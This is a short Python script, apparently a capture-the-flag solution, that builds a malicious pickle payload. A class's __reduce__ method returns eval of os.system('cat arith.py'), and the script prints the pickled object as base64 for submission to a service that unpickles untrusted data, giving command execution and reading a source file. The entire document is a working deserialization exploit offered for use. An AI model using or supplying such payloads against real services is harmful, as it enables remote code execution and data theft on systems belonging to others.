import pickle, base64

class Shell_code:
    def __reduce__(self):
        return (eval, ("__import__('os').system('cat arith.py')",))

payload = pickle.dumps(Shell_code())
print(base64.b64encode(payload).decode())